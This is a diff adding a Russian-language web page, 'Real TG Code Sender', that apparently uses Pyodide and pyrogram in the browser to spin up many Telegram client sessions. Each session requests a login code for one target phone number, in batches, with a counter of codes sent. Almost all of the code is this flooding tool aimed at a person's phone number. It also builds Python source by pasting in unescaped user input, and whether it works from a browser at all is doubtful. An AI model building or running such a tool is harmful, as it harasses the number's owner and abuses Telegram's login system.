@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Real TG Code Sender · good</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background: #0b0b0e;
+            color: #e8e8e8;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            background: #18181c;
+            border-radius: 28px;
+            padding: 32px;
+            max-width: 760px;
+            width: 100%;
+            border: 1px solid #2a2a30;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.9);
+        }
+        h1 {
+            font-weight: 300;
+            font-size: 26px;
+            border-bottom: 1px solid #2a2a30;
+            padding-bottom: 16px;
+            display: flex;
+            justify-content: space-between;
+        }
+        h1 span { color: #6c6cff; }
+        label { display: block; margin: 18px 0 6px; font-size: 14px; color: #aaa; }
+        input, button {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 14px;
+            border: 1px solid #333;
+            background: #22222a;
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 6px;
+        }
+        input:focus { border-color: #6c6cff; outline: none; }
+        .row { display: flex; gap: 12px; }
+        .row button { flex: 1; }
+        .btn-primary { background: #6c6cff; border-color: #6c6cff; font-weight: 700; }
+        .btn-primary:hover { background: #7a7aff; }
+        .btn-danger { background: #a04040; border-color: #a04040; }
+        .btn-danger:hover { background: #b05050; }
+        #log {
+            background: #0a0a0e;
+            border-radius: 14px;
+            padding: 16px;
+            margin-top: 18px;
+            max-height: 340px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.7;
+            border: 1px solid #222;
+            white-space: pre-wrap;
+        }
+        #log::-webkit-scrollbar { width: 5px; }
+        #log::-webkit-scrollbar-thumb { background: #3a3a48; border-radius: 8px; }
+        .badge { background: #2a2a38; padding: 2px 12px; border-radius: 30px; font-size: 13px; }
+        .status { display: flex; gap: 20px; margin: 12px 0; font-size: 14px; }
+        .status span { color: #b0b0ff; font-weight: 700; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>⚡ good·tg <span>реальный</span></h1>
+
+    <label>📱 Номер Telegram (международный):</label>
+    <input id="phone" value="+79161234567" placeholder="+79001234567">
+
+    <label>🤖 Количество ботов (сессий):</label>
+    <input id="count" type="number" value="5" min="1" max="50">
+
+    <label>🔑 API ID (с my.telegram.org):</label>
+    <input id="apiId" value="12345" placeholder="ваш api_id">
+
+    <label>🔐 API HASH:</label>
+    <input id="apiHash" value="ваш_апи_хэш" placeholder="ваш api_hash">
+
+    <div class="row">
+        <button class="btn-primary" id="startBtn">▶ СТАРТ (реальный запрос)</button>
+        <button class="btn-danger" id="stopBtn">⏹ СТОП</button>
+    </div>
+    <button id="clearBtn" style="background:#2a2a30; margin-top:6px;">🧹 Очистить лог</button>
+
+    <div class="status">
+        <div>Отправлено: <span id="sentCount">0</span></div>
+        <div>Активно: <span id="activeCount">0</span></div>
+    </div>
+
+    <div id="log">[good] Загрузка Pyodide... Ожидайте.</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/pyodide/v0.26.2/full/pyodide.js"></script>
+<script>
+    let pyodide = null;
+    let running = false;
+    let stopRequested = false;
+    let sentTotal = 0;
+    let activeBots = 0;
+
+    const logDiv = document.getElementById('log');
+    const phoneInput = document.getElementById('phone');
+    const countInput = document.getElementById('count');
+    const apiIdInput = document.getElementById('apiId');
+    const apiHashInput = document.getElementById('apiHash');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const sentSpan = document.getElementById('sentCount');
+    const activeSpan = document.getElementById('activeCount');
+
+    function addLog(msg) {
+        const time = new Date().toLocaleTimeString('ru-RU', { hour12: false });
+        logDiv.innerHTML += `[${time}] ${msg}\n`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    function updateStats() {
+        sentSpan.textContent = sentTotal;
+        activeSpan.textContent = activeBots;
+    }
+
+    // Инициализация Pyodide
+    async function initPyodide() {
+        addLog('⏳ Загрузка Pyodide...');
+        pyodide = await loadPyodide();
+        await pyodide.loadPackage('micropip');
+        addLog('✅ Pyodide загружен. Установка pyrogram...');
+        await pyodide.runPythonAsync(`
+            import micropip
+            await micropip.install('pyrogram')
+            await micropip.install('tgcrypto')
+            print('✅ Библиотеки установлены')
+        `);
+        addLog('✅ Все готово к отправке реал��ных запросов.');
+    }
+
+    // Реальная отправка кода через MTProto из браузера
+    async function sendRealCode(sessionId, phone, apiId, apiHash) {
+        if (stopRequested) return false;
+        activeBots++;
+        updateStats();
+        try {
+            const result = await pyodide.runPythonAsync(`
+                import asyncio
+                from pyrogram import Client
+                from pyrogram.errors import FloodWait, PhoneNumberInvalid
+
+                async def send(phone, api_id, api_hash, sid):
+                    session_name = f"session_{sid}"
+                    app = Client(session_name, api_id=api_id, api_hash=api_hash, in_memory=True)
+                    try:
+                        await app.start()
+                        await app.send_code(phone)
+                        await app.stop()
+                        return True, None
+                    except FloodWait as e:
+                        return False, f"FloodWait {e.value}с"
+                    except PhoneNumberInvalid:
+                        return False, "Неверный номер"
+                    except Exception as e:
+                        return False, str(e)[:60]
+                    finally:
+                        try: await app.stop()
+                        except: pass
+
+                result = await send("${phone}", ${apiId}, "${apiHash}", ${sessionId})
+                result
+            `);
+            const [success, error] = result;
+            if (success) {
+                addLog(`✅ Бот #${sessionId} — код отправлен на ${phone}`);
+                sentTotal++;
+            } else {
+                addLog(`❌ Бот #${sessionId} — ошибка: ${error}`);
+            }
+        } catch(e) {
+            addLog(`⚠️ Бот #${sessionId} — исключение: ${e.message || e}`);
+        }
+        activeBots--;
+        updateStats();
+        return true;
+    }
+
+    async function runBots(phone, count, apiId, apiHash) {
+        if (running) { addLog('⚠️ Уже запущено'); return; }
+        if (!phone || phone.length < 6) { addLog('⚠️ Введите номер'); return; }
+        if (!apiId || !apiHash || apiId === '12345' || apiHash === 'ваш_апи_хэш') {
+            addLog('⚠️ Введите реальный API ID и HASH с my.telegram.org');
+            return;
+        }
+        if (!pyodide) { addLog('⏳ Pyodide еще не загружен...'); return; }
+
+        running = true;
+        stopRequested = false;
+        sentTotal = 0;
+        activeBots = 0;
+        updateStats();
+        addLog(`🚀 СТАРТ: ${count} ботов для ${phone}`);
+
+        const batchSize = 5; // не перегружаем браузер
+        let completed = 0;
+        for (let i = 0; i < count; i += batchSize) {
+            if (stopRequested) break;
+            const batch = [];
+            for (let j = i; j < Math.min(i + batchSize, count); j++) {
+                batch.push(sendRealCode(j, phone, apiId, apiHash));
+            }
+            await Promise.all(batch);
+            completed += batch.length;
+            if (!stopRequested) await new Promise(r => setTimeout(r, 300));
+        }
+
+        running = false;
+        if (stopRequested) {
+            addLog(`⏹ Остановлено. Отправлено: ${sentTotal}`);
+        } else {
+            addLog(`✅ Завершено. Отправлено запросов: ${sentTotal}`);
+        }
+        stopRequested = false;
+        updateStats();
+    }
+
+    // Обработчики
+    startBtn.onclick = async () => {
+        const phone = phoneInput.value.trim();
+        const count = parseInt(countInput.value) || 5;
+        const apiId = parseInt(apiIdInput.value.trim());
+        const apiHash = apiHashInput.value.trim();
+        if (!pyodide) { await initPyodide(); }
+        runBots(phone, count, apiId, apiHash);
+    };
+
+    stopBtn.onclick = () => {
+        if (running) {
+            stopRequested = true;
+            addLog('🛑 Сигнал остановки...');
+        } else {
+            addLog('⏸ Нет активного запуска');
+        }
+    };
+
+    clearBtn.onclick = () => {
+        logDiv.innerHTML = '[good] Лог очищен.\n';
+    };
+
+    // Автозагрузка Pyodide при открытии
+    initPyodide();
+</script>
+</body>
+</html>
